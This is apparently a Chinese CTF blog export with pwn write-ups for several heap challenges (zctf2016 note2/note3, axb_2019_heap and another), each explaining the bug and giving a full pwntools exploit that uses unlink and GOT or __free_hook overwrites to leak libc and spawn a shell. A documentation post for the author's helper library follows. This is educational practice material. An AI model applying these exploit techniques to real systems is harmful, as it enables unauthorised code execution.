<h4 id="大致思路"><a href="#大致思路" class="headerlink" title="大致思路"></a>大致思路</h4><p>整体思路，利用溢出构造fake_chunk，然后释放引线堆块(就是fake_chunk下面（高地址）的那个chunk)，此时已经可以去修改bss段上存储的chunk信息，由于不能直接寻址泄露函数的真实地址。因此需要去用puts来进行寻址泄露。先将free的got地址改为puts的plt地址，因为传给puts的参数是一个指针，然后puts就会进行寻址泄露，因此只要bss地址存放的chunk地址改成puts的got表，然后free掉这个位置的chunk(此时已经是puts的got表了，而且free被劫持成了puts),就可以泄露出来函数的真实地址了。然后同样的手法修改free的got表为system的地址就行，最后free掉装有&#x2F;bin&#x2F;sh的chunk即可获取shell。<br>tools这个函数库的源码在这 <a href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">here</a></p>
<h4 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p,e,libc=load(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;node4.buuoj.cn&#x27;,26316)</span></span><br><span class="line">debug(p,<span class="number">0x400B7A</span>,<span class="number">0x400A87</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line">ptr=<span class="number">0x602150</span></span><br><span class="line">add(<span class="number">0x20</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x20</span>)<span class="comment">#2 unlink</span></span><br><span class="line">add(<span class="number">0x80</span>)<span class="comment">#3 lead chunk</span></span><br><span class="line">add(<span class="number">0x20</span>)<span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x20</span>)<span class="comment">#5 prevent merge</span></span><br><span class="line">puts_got_addr=e.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">payload=p64(puts_got_addr)</span><br><span class="line">edit(<span class="number">4</span>,<span class="number">0x8</span>,payload)</span><br><span class="line">fake_chunk=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">fake_chunk+=p64(ptr-<span class="number">0x18</span>)+p64(ptr-<span class="number">0x10</span>)</span><br><span class="line">fake_chunk+=p64(<span class="number">0x20</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0x30</span>,fake_chunk)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">5</span>,<span class="number">0x8</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">free_got_addr=e.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">puts_plt_addr=e.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">3</span>+p64(free_got_addr)+p64(<span class="number">0</span>)+p64(puts_got_addr)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0x30</span>,payload)</span><br><span class="line"></span><br><span class="line">payload=p64(puts_plt_addr)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0x8</span>,payload)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">puts_addr=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log(<span class="string">&#x27;puts_addr&#x27;</span>,<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">sys_addr,bin_sh_addr=local_search(<span class="string">&#x27;puts&#x27;</span>,puts_addr,libc)</span><br><span class="line"><span class="comment">#sys_addr,bin_sh_addr=long_search(&#x27;puts&#x27;,puts_addr)</span></span><br><span class="line">payload=p64(sys_addr)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0x8</span>,payload)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="/../img/2706180-20220625221902497-1011860752.png"></p>
<h3 id="zctf2016-note2"><a href="#zctf2016-note2" class="headerlink" title="zctf2016_note2"></a>zctf2016_note2</h3><h4 id="保护策略"><a href="#保护策略" class="headerlink" title="保护策略"></a>保护策略</h4><p><img src="/../img/2706180-20220625221916782-1505040812.png"></p>
<h4 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h4><p><img src="/../img/2706180-20220625221927065-1302076520.png"></p>
<p>漏洞点在这里,在比较的时候，拿了无符号数和有符号数做比较，程序会自动将其转化为无符号数来判断，也就是a2我们输入成0，那就是-1&gt;i，把-1转化成无符号数0xffffffff。因此输入的内容就成了0xffffffff字节的数据。毫无疑问这里存在了溢出。</p>
<p>不过由于输入的是0，因此malloc申请chunk的时候，自然就申请了0x20字节的chunk（0x10的chunk头，0x10的最小用户空间）</p>
<p>为什么要先提这里，难道edit函数不存在溢出漏洞么？下面分析一下。</p>
<p><img src="/../img/2706180-20220625222007500-1812777143.png"></p>
<p>这里就要了个索引，然后就可以往里面输入数据了，最多能输入144字节的数据。似乎只要申请一个小点的chunk，用edit也能溢出，然后unlink。</p>
<p>但是有一个地方要注意到，edit函数确实可以溢出，但是会被00截断，因为下面strlen函数。</p>
<p><img src="/../img/2706180-20220625222019802-1809134741.png"></p>
<p>这里似乎看的是将输入的数据中%去除掉，但是在遍历的时候，用了strlen来判断字符串的结尾，因此输入数据如果出现了p64打包的字节流，就会将strlen截断，从而拷贝数据失败。</p>
<p>因此想通过溢出来进行unlink，还要通过add函数的溢出。</p>
<h4 id="大致思路-1"><a href="#大致思路-1" class="headerlink" title="大致思路"></a>大致思路</h4><p>先申请三个chunk，第一个大小无所谓，让它来存放fake_chunk，然后第二个chunk的大小要为0，因为要溢出它，但是由于用户空间只有0x10，所以只能将fake_chunk布置到低地址的那个chunk（就是第一个chunk），然后利用溢出，修改第三个chunk的prev_size和size，充当引线堆块。引线堆块的大小没的说，要大于0x80,因为不能让它free掉的时候进入到fastbin里面。</p>
<p>剩下的就是常规unlink的操作了，将引线堆块释放掉，然后fake_chunk的地址被放到了bss段上。edit编辑bss段上存放的chunk信息，然后进行泄露函数真实地址和篡改got表的操作，最终获取shell。</p>
<p>以这道题为例，指的一提的是unlink要通过检查 就要伪造&amp;fake_chunk-0x18 和 &amp;fake_chunk-0x10 而bss段放的是chunk的用户地址（这个用户地址也就是正常情况下fake_chunk所处的地址)，所以chunk 1的地址下面的内容最开始就要是伪造的&amp;fake_chunk-0x18 和 &amp;fake_chunk-0x10，而不能将fake_chunk放到其他位置。</p>
<h4 id="EXP："><a href="#EXP：" class="headerlink" title="EXP："></a>EXP：</h4><p><a href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">tools源码</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p,e,libc=load(<span class="string">&quot;a&quot;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;node4.buuoj.cn&#x27;,27755)</span></span><br><span class="line"><span class="comment">#debug(p,0x400F4F)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;option---&gt;&gt;\n&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Input the id of the note:\n&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">lenth,content</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;option---&gt;&gt;\n&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Input the length of the note content:(less than 128)\n&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(lenth))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Input the note content:\n&#x27;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,choice,content</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;option---&gt;&gt;\n&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Input the id of the note:\n&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;do you want to overwrite or append?[1.overwrite/2.append]\n&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(choice))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;TheNewContents:&#x27;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;option---&gt;&gt;\n&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Input the id of the note:\n&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">p.sendline(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">ptr=<span class="number">0x602120</span></span><br><span class="line">fake_chunk=p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>)</span><br><span class="line">fake_chunk+=p64(ptr-<span class="number">0x18</span>)+p64(ptr-<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0x70</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line">add(<span class="number">0x50</span>,fake_chunk)</span><br><span class="line">add(<span class="number">0x0</span>,<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;ddddd&#x27;</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0</span>,payload)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">atoi_got_addr=e.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(atoi_got_addr)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">1</span>,payload)<span class="comment">#前面是垃圾数据（非0）后面只有这一个地址，因此地址中的00被截断了，也不影响数据本身</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">atoi_addr=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log(<span class="string">&#x27;atoi&#x27;</span>,<span class="built_in">hex</span>(atoi_addr))</span><br><span class="line">sys_addr,bin_sh_addr=local_search(<span class="string">&#x27;atoi&#x27;</span>,atoi_addr,libc)</span><br><span class="line"><span class="comment">#sys_addr,bin_sh_addr=long_search(&#x27;atoi&#x27;,atoi_addr)</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">1</span>,p64(sys_addr))</span><br><span class="line">p.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="zctf-2016-note3"><a href="#zctf-2016-note3" class="headerlink" title="zctf_2016_note3"></a>zctf_2016_note3</h3><h4 id="保护策略：-1"><a href="#保护策略：-1" class="headerlink" title="保护策略："></a>保护策略：</h4><p><img src="/../img/2706180-20220625222036558-1667669742.png"></p>
<h4 id="程序分析："><a href="#程序分析：" class="headerlink" title="程序分析："></a>程序分析：</h4><p><img src="/../img/2706180-20220625222045970-1527119726.png"></p>
<p>漏洞和note2一样，依旧拿着int类型和unsigned int类型作比较，导致-1可以变成一个很大的整数，从而导致输入产生了溢出。</p>
<p>然后这道题的show函数，无法使用，就导致了泄露不是那么舒服。</p>
<h4 id="大致思路-2"><a href="#大致思路-2" class="headerlink" title="大致思路"></a>大致思路</h4><p>然后常规unlink的手段，跟note2的手法一样，就不再赘述。</p>
<p>unlink之后，要泄露函数的真实地址。先将free函数的got表改为puts的plt地址，然后再把bss段存放的chunk地址改成puts的got地址，执行free进行泄露。需要注意的是输入的数据最后会被加上00，这道题free的got表和puts的got表是挨着的，如果把p64打包的数据给free后，最后加上的00会覆盖puts的真实的最低字节。导致puts无法正常使用，程序会崩溃。</p>
<p>因此发送p64打包的地址时，需要用切片处理一下，发送7个字节即可，加上\n八字节，然后程序会将\n换成00，因此不会干扰到puts的真实地址。</p>
<p><a href="(https://www.cnblogs.com/ZIKH26/articles/16307343.html)">tools源码</a></p>
<h4 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p,e,libc=load(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27797</span>)</span><br><span class="line"><span class="comment">#debug(p,0x400BB9)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">lenth,content</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;option---&gt;&gt;\n&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Input the length of the note content:(less than 1024)\n&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(lenth))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Input the note content:\n&#x27;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;option---&gt;&gt;\n&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Input the id of the note:\n&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Input the new content:\n&#x27;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):    </span><br><span class="line">    p.recvuntil(<span class="string">&#x27;option---&gt;&gt;\n&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Input the id of the note:\n&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">ptr=<span class="number">0x6020C8</span></span><br><span class="line">fake_chunk=p64(<span class="number">0</span>)+p64(<span class="number">0x61</span>)</span><br><span class="line">fake_chunk+=p64(ptr-<span class="number">0x18</span>)+p64(ptr-<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">0x40</span>,fake_chunk)</span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0x60</span>)+p64(<span class="number">0x90</span>)<span class="comment">#fake_chunk</span></span><br><span class="line">add(<span class="number">0x0</span>,<span class="string">&#x27;1&#x27;</span>)<span class="comment">#overflow_chunk</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)<span class="comment">#lead_chunk</span></span><br><span class="line">add(<span class="number">0x70</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)<span class="comment">#par_chunk</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x0</span>,payload)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">free_got_addr=e.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">puts_got_addr=e.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt_addr=e.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">3</span>+p64(free_got_addr)+p64(puts_got_addr)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">payload=p64(puts_plt_addr)[:<span class="number">7</span>]</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">puts_addr=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log(<span class="string">&#x27;puts_addr&#x27;</span>,<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">sys_addr,bin_sh_addr=long_search(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">edit(<span class="number">0</span>,p64(sys_addr)[:<span class="number">7</span>])</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p><img src="/../img/2706180-20220625222103836-1038592504.png"></p>
<h3 id="axb-2019-heap"><a href="#axb-2019-heap" class="headerlink" title="axb_2019_heap"></a>axb_2019_heap</h3><h4 id="保护策略：-2"><a href="#保护策略：-2" class="headerlink" title="保护策略："></a>保护策略：</h4><p><img src="/../img/image-20221007182429275.png" alt="image-20221007182429275"></p>
<h4 id="漏洞所在："><a href="#漏洞所在：" class="headerlink" title="漏洞所在："></a>漏洞所在：</h4><p><img src="/../img/image-20221007182443910.png" alt="image-20221007182443910"></p>
<p>banner函数里面存在一个格式化字符串漏洞，根据以往的经验，通常堆+格式化字符串漏洞的题目中，格式化字符串漏洞都起到一个泄露地址的作用。因为存在这个漏洞，所以我们就相当于有了libc基地址，程序基地址。</p>
<p><img src="/../img/image-20221007182456742.png" alt="image-20221007182456742"></p>
<p>get_input函数中存在一个off_by_one漏洞。由于我们有程序基地址，所以就能拿到bss段上存储chunk信息的地址，就可以打unlink(这道题我最开始考虑的是off by one+double free+fastbin attack，不过在构造的时候想起来了，这道题释放的堆块进入不到fastbin中)</p>
<h4 id="EXP-3"><a href="#EXP-3" class="headerlink" title="EXP:"></a>EXP:</h4><p><a href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">tools源码</a></p>
<p>整体来说就是一个格式化字符串泄露地址+unlink 比较简单，这里我就直接放exp了。</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p,e,libc= load(<span class="string">&quot;a&quot;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28336</span>)</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">d_a=<span class="number">0x11A8</span></span><br><span class="line">d_d=<span class="number">0x11ba</span></span><br><span class="line">d_e=<span class="number">0x11e0</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Enter the index you want to create (0-10):&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Enter a size:\n&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Enter the content: \n&#x27;</span>,content)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Done!\n&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Enter an index:\n&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Enter the content: \n&#x27;</span>,content)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Done!\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Enter an index:\n&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    <span class="comment">#p.recvuntil(&#x27;Done!\n&#x27;)</span></span><br><span class="line"><span class="comment">#debug(p,&#x27;pie&#x27;,d_e,d_a,d_d)</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Enter your name: &#x27;</span>,<span class="string">b&#x27;%15$p%14$p&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Hello, &#x27;</span>)</span><br><span class="line">leak_libc_addr=<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">log_addr(<span class="string">&#x27;leak_libc_addr&#x27;</span>)</span><br><span class="line">libc_base_addr=leak_libc_addr-<span class="number">0x20830</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base_addr&#x27;</span>)</span><br><span class="line">base_addr=<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)-<span class="number">0x1200</span></span><br><span class="line">log_addr(<span class="string">&#x27;base_addr&#x27;</span>)</span><br><span class="line">ptr=base_addr+<span class="number">0x202070</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x98</span>,<span class="string">&#x27;aaaabbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x98</span>,<span class="string">&#x27;ccccdddd&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x98</span>,<span class="string">&#x27;eeeeffff&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x98</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">fake_chunk=p64(<span class="number">0</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line">fake_chunk+=p64(ptr-<span class="number">0x18</span>)+p64(ptr-<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,fake_chunk+<span class="number">0x70</span>*<span class="string">b&#x27;a&#x27;</span>+p64(<span class="number">0x90</span>)+<span class="string">b&#x27;\xa0&#x27;</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">free_hook=libc_base_addr+<span class="number">0x3c67a8</span> </span><br><span class="line">sys_addr=libc_base_addr+<span class="number">0x0000000000045390</span></span><br><span class="line">edit(<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(free_hook)+p64(<span class="number">0x20</span>))</span><br><span class="line">edit(<span class="number">0</span>,p64(sys_addr))</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="/../img/image-20221007182508865.png" alt="image-20221007182508865"></p>
]]></content>
      <categories>
        <category>学习总结</category>
      </categories>
      <tags>
        <tag>篡改got表</tag>
        <tag>堆溢出</tag>
        <tag>unlink</tag>
      </tags>
  </entry>
  <entry>
    <title>tools-函数库</title>
    <url>/posts/ad411136.html</url>
    <content><![CDATA[<p>我和我的同学 <a href="https://www.cnblogs.com/trunk/">trunk</a> 还有我学弟 <a href="https://www.cnblogs.com/Sta8r9/">Sta8r9</a>  共同编写一些方便解PWN题的<del>鸡肋</del>函数封装到了这个库里，第一是平常用起来方便顺手，第二顺便练习下编程能力，第三如果以后有可能的话，希望逐渐做成像 <strong>roderick</strong> 师傅的<a href="https://github.com/RoderickChan/pwncli">pwncli</a>那样。</p>
<p><a href="https://github.com/ZIKH26/tools/blob/master/tools.py">源代码</a></p>
<p>一条命令下载 <code>tools</code> 函数库</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/ZIKH26/tools/master/tools.py</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<p><strong><code>tools</code> 库只支持python3</strong></p>
<h2 id="命令行参数："><a href="#命令行参数：" class="headerlink" title="命令行参数："></a>命令行参数：</h2><p>为了不在打远程和本地，以及打本地时是否开启调试选择中来不断的更改脚本，因此我设置了命令行参数来直接做切换。</p>
<p>1 去打远程且不开启脚本中的调试</p>
<p>2 打本地且不开启脚本中的调试</p>
<p>如果不加命令行参数，则默认打本地，若有debug函数则自动开启调试。</p>
<p>假设你现在想打远程</p>
<p>那么你需要在脚本里写<code>p,e,libc=load(&quot;heap&quot;,&quot;node4.buuoj.cn:27339&quot;)</code> (程序名和ip&amp;port请自行更改，这里只是举例说明)</p>
<p>然后运行脚本时使用命令 如下(即使脚本中有debug函数也不影响打远程)</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 exp.py 1</span><br></pre></td></tr></table></figure>

<p>如果打本地时，不想去让脚本执行debug函数，那么命令可以如下(这样的好处是即使脚本中存在debug函数，但不想在本次执行脚本时debug也不需要来回去脚本里注释了)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 exp.py 2</span><br></pre></td></tr></table></figure>

<p><strong>如果直接运行exp.py的话，即使脚本里存在ip和port也不会去打远程</strong></p>
<p>此外，假设你打本地所依赖的libc是2.23-0ubuntu11.3版本 而远程服务器程序所依赖的libc是2.23-0ubuntu11版本。二者仅仅是小版本有细微的不同，可能one_gadget和一些libc里函数的偏移有点不同，如果来回去修改的话，有点麻烦，因此在load函数的第三个参数可以设置远程依赖的libc，这样用后面search_og函数或者libc.symbols找的函数地址都会自动切换到远程所依赖的libc。</p>
<p>示例如下:</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">p,e,libc=load(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;node4.buuoj.cn:29026&quot;</span>,<span class="string">&quot;libc-2.23.so&quot;</span>)</span><br></pre></td></tr></table></figure>



<h2 id="各个函数的使用说明"><a href="#各个函数的使用说明" class="headerlink" title="各个函数的使用说明"></a>各个函数的使用说明</h2><h3 id="long-search-amp-local-search"><a href="#long-search-amp-local-search" class="headerlink" title="long_search&amp;local_search"></a>long_search&amp;local_search</h3><p>作用：这两个函数就是去libc中寻找system函数和&#x2F;bin&#x2F;sh的地址（分别用于本地和远程）<br>优点：将用LibcSearcher搜索并装载的重复的代码都放到了函数内部，现在一行就可以获取system和&#x2F;bin&#x2F;sh地址，因此您的脚本看起来更为简洁。</p>
<p>使用范例</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sys_addr,bin_sh_addr=long_search(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line"></span><br><span class="line">sys_addr,bin_sh_addr=local_search(<span class="string">&#x27;puts&#x27;</span>,puts_addr,libc)</span><br><span class="line"><span class="string">&quot;&quot;&quot;libc指的是装载本地的libc,例如在脚本开始声明&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;libc=ELF(&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;)&quot;&quot;&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="log"><a href="#log" class="headerlink" title="log"></a>log</h3><p>作用：这个函数就是单纯的打印一下某些变量的信息，类似于日志（但我更建议去使用下面的log_addr函数）<br>优点：加了箭头和字体颜色效果，可以更清楚的打印所需要的信息</p>
<p>使用范例</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">puts=<span class="number">123456</span></span><br><span class="line">log(<span class="string">&#x27;puts_addr&#x27;</span>,puts_addr)</span><br></pre></td></tr></table></figure>

<h3 id="log-addr"><a href="#log-addr" class="headerlink" title="log_addr"></a>log_addr</h3><p>如果你仅仅是想看一下变量对应的值是否是你需要的那个地址，同时感觉上面这个log函数太麻烦还需要两个参数，那么你不妨试试log_addr函数。</p>
